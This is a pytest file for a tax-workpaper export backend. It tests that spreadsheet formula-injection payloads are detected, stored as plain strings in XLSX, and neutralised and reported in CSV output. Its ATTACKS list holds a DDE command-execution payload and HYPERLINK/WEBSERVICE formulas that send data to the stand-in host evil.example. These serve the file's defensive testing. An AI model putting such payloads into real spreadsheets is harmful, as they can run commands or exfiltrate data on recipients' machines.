"""Formula injection, cell limits and the honesty of the neutralisation log.

A tax workpaper is a document people email to their accountant, which is the
exact delivery path a spreadsheet formula injection is designed for. The
payloads below are the published ones; the point of the tests is that the two
output formats each defend against them in the way their format allows, and
that the CSV says where it had to alter a value.
"""

from __future__ import annotations

import csv
import io
from datetime import UTC, datetime
from decimal import Decimal

import pytest
from openpyxl import load_workbook

from backend.app.reports.csv_writer import write_csv_bundle
from backend.app.reports.models import (
    Column,
    Sheet,
    Workpaper,
    money,
    text,
)
from backend.app.reports.safety import (
    MAX_CELL_LENGTH,
    SanitisationLog,
    is_formula_like,
    neutralise_for_csv,
    safe_sheet_name,
    strip_control_characters,
    truncate_cell,
)
from backend.app.reports.xlsx_writer import write_xlsx

#: Payloads seen in the wild against spreadsheet exports.
ATTACKS = [
    "=cmd|'/c calc'!A1",
    "=1+1",
    "+1+1",
    "-1+1",
    "@SUM(1+1)",
    "=HYPERLINK(\"http://evil.example/?\"&A1,\"click\")",
    "=WEBSERVICE(\"http://evil.example/steal\")",
    "\t=1+1",
    " =1+1",
]


def paper_with(*values: str) -> Workpaper:
    sheet = Sheet(
        name="Data",
        columns=[Column("Description", 40)],
        rows=[[text(value)] for value in values],
    )
    return Workpaper(
        title="Test workpaper",
        generated_at=datetime(2026, 3, 1, 12, 0, tzinfo=UTC),
        sheets=[sheet],
    )


# --- detection ------------------------------------------------------------


@pytest.mark.parametrize("payload", ATTACKS)
def test_every_known_payload_is_detected(payload: str) -> None:
    assert is_formula_like(payload)


def test_leading_whitespace_does_not_hide_a_formula() -> None:
    """Spreadsheets trim before deciding, so detection has to as well."""
    assert is_formula_like("   =1+1")
    assert is_formula_like("\t\t=1+1")


def test_ordinary_text_is_not_flagged() -> None:
    for value in ("NVIDIA Corporation", "2025-01-02", "1,234.00", "", "A=B"):
        assert not is_formula_like(value)


# --- xlsx: typed, not altered --------------------------------------------


@pytest.mark.parametrize("payload", ATTACKS)
def test_xlsx_never_writes_a_formula_cell(payload: str) -> None:
    """The defence that costs nothing: declare the cell a string."""
    content, _log = write_xlsx(paper_with(payload))
    workbook = load_workbook(io.BytesIO(content))
    cell = _first_data_cell(workbook["Data"], payload)

    assert cell.data_type == "s"
    assert cell.value == payload


def test_xlsx_preserves_the_original_text_exactly() -> None:
    """No apostrophe, no escaping: the reader sees what the broker wrote."""
    payload = "=cmd|'/c calc'!A1"
    content, log = write_xlsx(paper_with(payload))
    workbook = load_workbook(io.BytesIO(content))

    assert _first_data_cell(workbook["Data"], payload).value == payload
    assert log.clean


def test_xlsx_does_not_leave_a_formula_in_the_stored_xml() -> None:
    """Asserted against the file itself, not openpyxl's view of it."""
    import zipfile

    content, _log = write_xlsx(paper_with("=1+1"))
    with zipfile.ZipFile(io.BytesIO(content)) as archive:
        sheet_xml = next(
            archive.read(name).decode("utf-8")
            for name in archive.namelist()
            if name.startswith("xl/worksheets/sheet")
        )

    assert "<f>" not in sheet_xml


# --- csv: altered, and said so -------------------------------------------


@pytest.mark.parametrize("payload", ATTACKS)
def test_csv_neutralises_every_payload(payload: str) -> None:
    safe, changed = neutralise_for_csv(payload)

    assert changed
    assert not is_formula_like(safe)


def test_csv_leaves_a_negative_number_alone() -> None:
    """A minus sign is a trigger character and also just arithmetic.

    Prefixing every negative amount would turn numbers into text for every
    consumer of the file, to defend against a value that no spreadsheet
    evaluates as a formula anyway.
    """
    for value in ("-1234.00", "-0.5", "+42", "-1e6"):
        safe, changed = neutralise_for_csv(value)
        assert safe == value
        assert not changed


def test_csv_output_is_safe_to_open() -> None:
    files, log = write_csv_bundle(paper_with("=1+1", "NVIDIA Corporation"))
    data = next(f for f in files if f.file_name.endswith("data.csv"))
    rows = list(csv.reader(io.StringIO(data.content.decode("utf-8-sig"))))

    assert ["'=1+1"] in rows
    assert ["NVIDIA Corporation"] in rows
    assert len(log.neutralised) == 1


def test_the_manifest_reports_what_was_altered() -> None:
    """Silently changing a value is the thing to avoid here."""
    files, _log = write_csv_bundle(paper_with("=1+1"))
    manifest = files[0].content.decode("utf-8-sig")

    assert files[0].file_name == "00-manifest.csv"
    assert "1 cell(s) began with a character" in manifest
    assert "Data!Description row 1" in manifest
    assert "xlsx" in manifest


def test_a_clean_bundle_says_nothing_was_altered() -> None:
    files, log = write_csv_bundle(paper_with("NVIDIA Corporation"))

    assert log.clean
    assert "No cell required alteration" in files[0].content.decode("utf-8-sig")


# --- control characters and limits ---------------------------------------


def test_control_characters_are_removed() -> None:
    """They are illegal in XLSX XML and corrupt a CSV row."""
    assert strip_control_characters("ab\x00c\x07d") == "abcd"


def test_line_breaks_and_tabs_survive() -> None:
    """A broker description genuinely can contain them."""
    assert strip_control_characters("line one\nline two\tend") == (
        "line one\nline two\tend"
    )


def test_an_oversized_cell_is_clipped_and_marked() -> None:
    clipped, was_clipped = truncate_cell("x" * (MAX_CELL_LENGTH + 100))

    assert was_clipped
    assert len(clipped) == MAX_CELL_LENGTH
    assert clipped.endswith("[truncated]")


def test_an_oversized_cell_does_not_produce_an_unopenable_file() -> None:
    content, log = write_xlsx(paper_with("y" * (MAX_CELL_LENGTH + 500)))
    workbook = load_workbook(io.BytesIO(content))

    assert len(_first_data_cell(workbook["Data"], None).value) <= MAX_CELL_LENGTH
    assert log.truncated


# --- sheet names ----------------------------------------------------------


def test_sheet_names_are_made_legal_and_unique() -> None:
    taken: set[str] = set()

    assert safe_sheet_name("Schedule FA A3", taken=taken) == "Schedule FA A3"
    assert safe_sheet_name("Schedule FA A3", taken=taken) == "Schedule FA A3 (2)"
    assert safe_sheet_name("a/b:c*d?e[f]", taken=taken) == "a b c d e f"
    assert len(safe_sheet_name("z" * 60, taken=taken)) == 31


# --- the log --------------------------------------------------------------


def test_the_log_summarises_rather_than_lists_everything() -> None:
    log = SanitisationLog()
    for index in range(20):
        log.record_neutralised("Data", "Description", index)

    note = log.notes()[0]
    assert "20 cell(s)" in note
    assert "and 15 more" in note


# --- numbers --------------------------------------------------------------


def test_numbers_stay_numbers_in_the_xlsx() -> None:
    """A preparer has to be able to total a column."""
    sheet = Sheet(
        name="Data",
        columns=[Column("Amount", 20)],
        rows=[[money(Decimal("152340"))]],
    )
    paper = Workpaper(
        title="t", generated_at=datetime(2026, 3, 1, tzinfo=UTC), sheets=[sheet]
    )
    content, _log = write_xlsx(paper)
    workbook = load_workbook(io.BytesIO(content))
    cell = _first_data_cell(workbook["Data"], 152340)

    assert cell.data_type == "n"
    assert cell.value == 152340


def test_an_exact_decimal_survives_into_the_file() -> None:
    """Written as Decimal so the file holds the digits, not a float's guess."""
    import zipfile

    sheet = Sheet(
        name="Data",
        columns=[Column("Amount", 20)],
        rows=[[money(Decimal("0.12345678"))]],
    )
    paper = Workpaper(
        title="t", generated_at=datetime(2026, 3, 1, tzinfo=UTC), sheets=[sheet]
    )
    content, _log = write_xlsx(paper)

    with zipfile.ZipFile(io.BytesIO(content)) as archive:
        sheet_xml = next(
            archive.read(name).decode("utf-8")
            for name in archive.namelist()
            if name.startswith("xl/worksheets/sheet")
        )

    assert "0.12345678" in sheet_xml


def _first_data_cell(worksheet, expected):  # noqa: ANN001, ANN202
    for row in worksheet.iter_rows():
        for cell in row:
            if expected is None:
                if isinstance(cell.value, str) and cell.value.startswith("y"):
                    return cell
            elif cell.value == expected:
                return cell
    raise AssertionError(f"no cell holding {expected!r}")
